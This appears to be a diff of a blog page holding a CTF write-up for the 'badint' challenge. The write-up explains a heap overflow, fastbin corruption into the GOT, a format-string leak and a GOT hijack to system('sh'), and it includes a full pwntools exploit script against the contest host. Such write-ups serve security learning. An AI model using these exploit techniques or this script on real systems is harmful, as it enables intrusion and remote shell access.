@@ -306,7 +306,7 @@
 <!-- more -->
 
 <p>This C++ program will read some input from user, then store the data into the heap memory:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./badint 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./badint 
 SEQ #: 0
 Offset: 0
 Data: AAAAAAA
@@ -316,10 +316,10 @@ Assembled [seq: 0]: aaaaaa0a
 
 SEQ #: 
 </code></pre></div></div>
-<p>Notice that if we input data <code class="highlighter-rouge">AAAA</code>, the program will convert <code class="highlighter-rouge">AAAA</code> to <code class="highlighter-rouge">0xaaaa</code>.</p>
+<p>Notice that if we input data <code class="language-plaintext highlighter-rouge">AAAA</code>, the program will convert <code class="language-plaintext highlighter-rouge">AAAA</code> to <code class="language-plaintext highlighter-rouge">0xaaaa</code>.</p>
 
 <p>According to my teammate, the following input will crash the program:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEQ #: 1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEQ #: 1
 Offset: 0
 Data: 0000000000000000000000000000000000000000000000000000000000000
 LSF Yes/No: Yes
@@ -347,13 +347,13 @@ Assembled [seq: 1]: 000000000000000022222202
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">get_len</span><span class="p">(</span><span class="n">cur_obj</span><span class="p">);</span>
  <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">get_data</span><span class="p">(</span><span class="n">cur_obj</span><span class="p">);</span>
  <span class="n">offset</span> <span class="o">=</span> <span class="n">get_offset</span><span class="p">(</span><span class="n">cur_obj</span><span class="p">);</span>
- <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">new_buf</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span> <span class="c1">// &lt;-- Here !!
-</span></code></pre></div></div>
+ <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">new_buf</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span> <span class="c1">// &lt;-- Here !!</span>
+</code></pre></div></div>
 
-<p>The program use <code class="highlighter-rouge">memcpy(new_buf + offset, data, len)</code> to copy the input data into a heap buffer. The variable <code class="highlighter-rouge">offet</code> can be controlled by us, and thus lead to a <strong>heap overflow vulnerability</strong>. The program crashed due to the <code class="highlighter-rouge">size</code> metadata was overwritten into an invalid size, causing the <code class="highlighter-rouge">free()</code> function aborted the program.</p>
+<p>The program use <code class="language-plaintext highlighter-rouge">memcpy(new_buf + offset, data, len)</code> to copy the input data into a heap buffer. The variable <code class="language-plaintext highlighter-rouge">offet</code> can be controlled by us, and thus lead to a <strong>heap overflow vulnerability</strong>. The program crashed due to the <code class="language-plaintext highlighter-rouge">size</code> metadata was overwritten into an invalid size, causing the <code class="language-plaintext highlighter-rouge">free()</code> function aborted the program.</p>
 
 <p>Now we spot the vulnerability, time to exploit the service. First we’ll have to leak some address. Here I leaked the libc’s address by doing the following:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./badint 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./badint 
 SEQ #: 1
 Offset: 8
 Data: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
@@ -364,10 +364,10 @@ Assembled [seq: 1]: 788ba4952b7f000011111111111111111111111111111111111111111111
 SEQ #:
 </code></pre></div></div>
 
-<p>Here we set the offset to 8, so the data we input will copy to <code class="highlighter-rouge">heap_buf+8</code>. <code class="highlighter-rouge">heap_buf</code> is a chunk in unsortbin which will be allocated for storing our input data, and thus its <code class="highlighter-rouge">fd</code> &amp; <code class="highlighter-rouge">bk</code> will contain the address of <code class="highlighter-rouge">main_arena+88</code>. We copy the data to <code class="highlighter-rouge">heap_buf+8</code>, means that <code class="highlighter-rouge">fd</code> will not be overwritten, and so we could leak the libc’s address by printing out the assembled data.</p>
+<p>Here we set the offset to 8, so the data we input will copy to <code class="language-plaintext highlighter-rouge">heap_buf+8</code>. <code class="language-plaintext highlighter-rouge">heap_buf</code> is a chunk in unsortbin which will be allocated for storing our input data, and thus its <code class="language-plaintext highlighter-rouge">fd</code> &amp; <code class="language-plaintext highlighter-rouge">bk</code> will contain the address of <code class="language-plaintext highlighter-rouge">main_arena+88</code>. We copy the data to <code class="language-plaintext highlighter-rouge">heap_buf+8</code>, means that <code class="language-plaintext highlighter-rouge">fd</code> will not be overwritten, and so we could leak the libc’s address by printing out the assembled data.</p>
 
 <p>The next step is to try hijack the program control flow. Here I decided to use the fastbin corruption attack. First we’ll have to arrange the following heap memory layout:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ hip
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ hip
 (0x20)     fastbin[0]: 0x0
 (0x30)     fastbin[1]: 0xc26cc0 --&gt; 0x0
 (0x40)     fastbin[2]: 0xc26c80 --&gt; 0x0
@@ -381,10 +381,10 @@ SEQ #:
 gdb-peda$ 
 </code></pre></div></div>
 
-<p>By using the amazing <a href="https://github.com/scwuaptx/Pwngdb/tree/master/angelheap">angelheap</a> from <a href="https://github.com/scwuaptx/Pwngdb">Pwngdb</a>, we could see that there’s a chunk in <code class="highlighter-rouge">fastbin[4]</code>(size = 0x60), and a chunk in <code class="highlighter-rouge">fastbin[2]</code>(size = 0x40).</p>
+<p>By using the amazing <a href="https://github.com/scwuaptx/Pwngdb/tree/master/angelheap">angelheap</a> from <a href="https://github.com/scwuaptx/Pwngdb">Pwngdb</a>, we could see that there’s a chunk in <code class="language-plaintext highlighter-rouge">fastbin[4]</code>(size = 0x60), and a chunk in <code class="language-plaintext highlighter-rouge">fastbin[2]</code>(size = 0x40).</p>
 
-<p>Then, we allocate the chunk in <code class="highlighter-rouge">fastbin[4]</code>, and copy our data into the chunk. Since there’s a heap overflow vulnerability, we can actually overwrite the data in chunk @ <code class="highlighter-rouge">fastbin[2]</code> – by setting the <code class="highlighter-rouge">offet</code> variable to <code class="highlighter-rouge">0x60</code> ( <code class="highlighter-rouge">0xc26c20</code> + <code class="highlighter-rouge">0x60</code> = <code class="highlighter-rouge">0xc26c80</code> ). We overwrite the <code class="highlighter-rouge">fd</code> pointer in chunk @ <code class="highlighter-rouge">fastbin[2]</code>, making it point to the GOT area. This is because in an x64 non-PIE binary, its GOT entries will contain some address which start with <code class="highlighter-rouge">0x40</code> (if the function hasn’t been resolved yet):</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x604018
+<p>Then, we allocate the chunk in <code class="language-plaintext highlighter-rouge">fastbin[4]</code>, and copy our data into the chunk. Since there’s a heap overflow vulnerability, we can actually overwrite the data in chunk @ <code class="language-plaintext highlighter-rouge">fastbin[2]</code> – by setting the <code class="language-plaintext highlighter-rouge">offet</code> variable to <code class="language-plaintext highlighter-rouge">0x60</code> ( <code class="language-plaintext highlighter-rouge">0xc26c20</code> + <code class="language-plaintext highlighter-rouge">0x60</code> = <code class="language-plaintext highlighter-rouge">0xc26c80</code> ). We overwrite the <code class="language-plaintext highlighter-rouge">fd</code> pointer in chunk @ <code class="language-plaintext highlighter-rouge">fastbin[2]</code>, making it point to the GOT area. This is because in an x64 non-PIE binary, its GOT entries will contain some address which start with <code class="language-plaintext highlighter-rouge">0x40</code> (if the function hasn’t been resolved yet):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x604018
 00:0000|  0x604018 --&gt; 0x7fbdea10c800 (&lt;__printf&gt;:      sub    rsp,0xd8)
 -------------------------------------------------------------------------
 01:0008|  0x604020 --&gt; 0x400ab6 (&lt;__gmon_start__@plt+6&gt;:        push   0x1)
@@ -398,16 +398,16 @@ gdb-peda$
 -------------------------------------------------------------------------
 07:0056|  0x604050 --&gt; 0x7fbdea0d7740 (&lt;__libc_start_main&gt;:     push   r14)
 </code></pre></div></div>
-<p>If we off-set the memory layout in the GOT area, we could found that it actually has some good <code class="highlighter-rouge">fastbin[2]</code>(again, size = 0x40) chunks:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x604042 &lt;setvbuf@got.plt+2&gt;:   0x0b0600007fbdea12      0x7740000000000040  &lt;-- here
+<p>If we off-set the memory layout in the GOT area, we could found that it actually has some good <code class="language-plaintext highlighter-rouge">fastbin[2]</code>(again, size = 0x40) chunks:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x604042 &lt;setvbuf@got.plt+2&gt;:   0x0b0600007fbdea12      0x7740000000000040  &lt;-- here
 0x604052 &lt;__libc_start_main@got.plt+2&gt;: 0x4ad000007fbdea0d      0x1b7000007fbdea12
 0x604062 &lt;strlen@got.plt+2&gt;:    0xdea000007fbdea14      0xc3c000007fbdea0e
 0x604072 &lt;signal@got.plt+2&gt;:    0x0b6600007fbdea0e      0x2650000000000040 &lt;-- here
 0x604082 &lt;alarm@got.plt+2&gt;:     0x0b8600007fbdea18      0x0b96000000000040 &lt;-- here
 0x604092 &lt;dlsym@got.plt+2&gt;:     0x0ba6000000000040      0x0bb6000000000040 &lt;-- and here !
 </code></pre></div></div>
-<p>While allocating a fastbin chunk, <strong>malloc.c will only check if its size is valid</strong>. For example, a chunk in <code class="highlighter-rouge">fastbin[2]</code> must have a size of <code class="highlighter-rouge">0x4X</code> ( yep, even a size of <code class="highlighter-rouge">0x4f</code> will still pass the check). So, after we overwrite the <code class="highlighter-rouge">fd</code> pointer in the chunk @ <code class="highlighter-rouge">fastbin[2]</code>:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ hip
+<p>While allocating a fastbin chunk, <strong>malloc.c will only check if its size is valid</strong>. For example, a chunk in <code class="language-plaintext highlighter-rouge">fastbin[2]</code> must have a size of <code class="language-plaintext highlighter-rouge">0x4X</code> ( yep, even a size of <code class="language-plaintext highlighter-rouge">0x4f</code> will still pass the check). So, after we overwrite the <code class="language-plaintext highlighter-rouge">fd</code> pointer in the chunk @ <code class="language-plaintext highlighter-rouge">fastbin[2]</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ hip
 (0x20)     fastbin[0]: 0x0
 (0x30)     fastbin[1]: 0x1da3cc0 --&gt; 0x0
 (0x40)     fastbin[2]: 0x1da3c80 --&gt; 0x604042 (size error (0xc740000000000040)) --&gt; 0x9ad000007f5e059a (invaild memory)
@@ -420,18 +420,18 @@ gdb-peda$
             unsortbin: 0x0
 gdb-peda$
 </code></pre></div></div>
-<p>We could see that <code class="highlighter-rouge">fastbin[2]</code> will have a fake chunk @ <code class="highlighter-rouge">0x604042</code> ( no need to worry about the size, <strong>malloc.c</strong> will only check the size with type <code class="highlighter-rouge">unsigned int</code> , just focus on the first 4 bytes ).</p>
+<p>We could see that <code class="language-plaintext highlighter-rouge">fastbin[2]</code> will have a fake chunk @ <code class="language-plaintext highlighter-rouge">0x604042</code> ( no need to worry about the size, <strong>malloc.c</strong> will only check the size with type <code class="language-plaintext highlighter-rouge">unsigned int</code> , just focus on the first 4 bytes ).</p>
 
-<p>Later we could just allocate the chunk in <code class="highlighter-rouge">fastbin[2]</code>. Once we allocate <code class="highlighter-rouge">0x604042</code>, we’ll be able to overwrite the GOT entry by copying our data into the fake fastbin chunk.</p>
+<p>Later we could just allocate the chunk in <code class="language-plaintext highlighter-rouge">fastbin[2]</code>. Once we allocate <code class="language-plaintext highlighter-rouge">0x604042</code>, we’ll be able to overwrite the GOT entry by copying our data into the fake fastbin chunk.</p>
 
-<p>But there’s one more problem: we don’t know the version of the libc. The libc address we leaked is the address of <code class="highlighter-rouge">main_arena+88</code>, neither <a href="https://github.com/niklasb/libc-database">libc-database</a> nor <a href="http://libcdb.com/">libcdb.com</a> can find the libc version with this symbol’s address.</p>
+<p>But there’s one more problem: we don’t know the version of the libc. The libc address we leaked is the address of <code class="language-plaintext highlighter-rouge">main_arena+88</code>, neither <a href="https://github.com/niklasb/libc-database">libc-database</a> nor <a href="http://libcdb.com/">libcdb.com</a> can find the libc version with this symbol’s address.</p>
 
 <p>So we’ll have to leak more addresses. However, although we can modify a function’s GOT, there’s no way we can store a GOT entry’s address in the function parameter. Luckily, I still managed to figure out the solution: <strong>by using the format string vulnerability.</strong></p>
 
-<p>We could modify <code class="highlighter-rouge">atol@got.plt</code> into <code class="highlighter-rouge">printf@got.plt</code>, which will turn <code class="highlighter-rouge">atol(our_input)</code> into <code class="highlighter-rouge">printf(our_input)</code>, <strong>thus we create a format string vulnerability, and we can use the vulnerability to leak an arbitrary address.</strong> By doing this, I was able to leak some GOT entries and found the correct version of libc at <a href="http://libcdb.com/">libcdb.com</a>. After that is simple, we could just hijack <code class="highlighter-rouge">atol</code>’s GOT and call <code class="highlighter-rouge">system('sh')</code> by entering “sh”.</p>
+<p>We could modify <code class="language-plaintext highlighter-rouge">atol@got.plt</code> into <code class="language-plaintext highlighter-rouge">printf@got.plt</code>, which will turn <code class="language-plaintext highlighter-rouge">atol(our_input)</code> into <code class="language-plaintext highlighter-rouge">printf(our_input)</code>, <strong>thus we create a format string vulnerability, and we can use the vulnerability to leak an arbitrary address.</strong> By doing this, I was able to leak some GOT entries and found the correct version of libc at <a href="http://libcdb.com/">libcdb.com</a>. After that is simple, we could just hijack <code class="language-plaintext highlighter-rouge">atol</code>’s GOT and call <code class="language-plaintext highlighter-rouge">system('sh')</code> by entering “sh”.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -440,15 +440,15 @@ gdb-peda$
 <span class="n">HOST</span> <span class="o">=</span> <span class="s">"badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">21813</span>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./badint"</span>
-<span class="c">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"</span>
-<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc-2.19_15.so"</span>
+<span class="c1">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
+</span><span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc-2.19_15.so"</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
-
-<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
+</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
+</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">add_data</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">lsf</span><span class="p">):</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"SEQ #:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">seq</span><span class="p">))</span>
@@ -461,55 +461,55 @@ gdb-peda$
     <span class="k">while</span> <span class="n">num</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
         <span class="n">now</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
         <span class="n">num</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
-        <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">'{:02x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">'{:02x}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
     
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-    
+    <span class="c1">#r = process(ELF_PATH)
+</span>    
     <span class="n">add_data</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s">"1"</span><span class="o">*</span><span class="mh">0x90</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Assembled [seq: 1]: "</span><span class="p">)</span>
-    <span class="c"># leak libc address</span>
-    <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="c1"># leak libc address
+</span>    <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
         <span class="n">addr</span> <span class="o">|=</span> <span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span>
     
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"addr: "</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
-    <span class="c"># libc.address = addr - 0x3c3b78 # local</span>
-    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x3be7b8</span> <span class="c"># remote</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
-    <span class="c"># gdb.attach(r, gdbscript=open('./ggg', 'r'))</span>
-    <span class="c"># arrange heap</span>
-    <span class="n">add_data</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"2"</span><span class="o">*</span><span class="mh">0xb0</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
+    <span class="c1"># libc.address = addr - 0x3c3b78 # local
+</span>    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x3be7b8</span> <span class="c1"># remote
+</span>    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="c1"># gdb.attach(r, gdbscript=open('./ggg', 'r'))
+</span>    <span class="c1"># arrange heap
+</span>    <span class="n">add_data</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"2"</span><span class="o">*</span><span class="mh">0xb0</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
     <span class="n">add_data</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"3"</span><span class="o">*</span><span class="mh">0x58</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
     <span class="n">add_data</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"4"</span><span class="o">*</span><span class="mh">0x38</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
-    <span class="c"># overwrite fastbin-&gt;fd ( in size 0x40 )</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span>
+    <span class="c1"># overwrite fastbin-&gt;fd ( in size 0x40 )
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x604042</span><span class="p">)</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x58</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
     <span class="n">add_data</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x60</span><span class="o">-</span><span class="mh">0x8</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
-    <span class="c"># now fastbin (size=0x40) has fake chunk @ got</span>
-    <span class="c"># allocate the fake chunk</span>
-    <span class="c"># overwrite got</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s">"6"</span><span class="o">*</span><span class="mi">12</span> <span class="c"># libc_start_main</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x400b26</span><span class="p">)</span> <span class="c"># resolve fgets</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x400b36</span><span class="p">)</span> <span class="c"># resolve strlen</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span> <span class="c"># hijack atol</span>
-    <span class="c">#payload += convert(elf.plt['printf']) # use format string to leak libc info</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">110</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+    <span class="c1"># now fastbin (size=0x40) has fake chunk @ got
+</span>    <span class="c1"># allocate the fake chunk
+</span>    <span class="c1"># overwrite got
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"6"</span><span class="o">*</span><span class="mi">12</span> <span class="c1"># libc_start_main
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x400b26</span><span class="p">)</span> <span class="c1"># resolve fgets
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x400b36</span><span class="p">)</span> <span class="c1"># resolve strlen
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span> <span class="c1"># hijack atol
+</span>    <span class="c1">#payload += convert(elf.plt['printf']) # use format string to leak libc info
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">110</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
     <span class="n">add_data</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="s">'No'</span><span class="p">)</span>
     
-    <span class="c"># hijack atol, send "sh" to get shell</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"SEQ #:"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">)</span>
+    <span class="c1"># hijack atol, send "sh" to get shell
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"SEQ #:"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">)</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"get shell!: "</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
-    <span class="c"># for exploiting format string &amp; leak libc info</span>
-    <span class="s">"""
+    <span class="c1"># for exploiting format string &amp; leak libc info
+</span>    <span class="s">"""
     payload = "</span><span class="si">%10</span><span class="s">$s.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p" + p64(elf.got['fgets'])
     r.sendlineafter("SEQ #:", payload)
     r.recv(1)
@@ -521,7 +521,7 @@ gdb-peda$
     """</span>
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">All ints are not the same... A239... Some can be bad ints!</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">All ints are not the same... A239... Some can be bad ints!</code></p>
 
         
       </section>
@@ -634,7 +634,6 @@ gdb-peda$
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -654,7 +653,6 @@ gdb-peda$
 
         
           
-          
 
 
 
@@ -673,7 +671,6 @@ gdb-peda$
 </div>
 
         
-          
           
 
 
@@ -696,7 +693,6 @@ gdb-peda$
 
         
           
-          
 
 
 
@@ -717,6 +713,7 @@ gdb-peda$
         
       </div>
     </div>
+  
   
 </div>
 
@@ -767,7 +764,7 @@ gdb-peda$
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
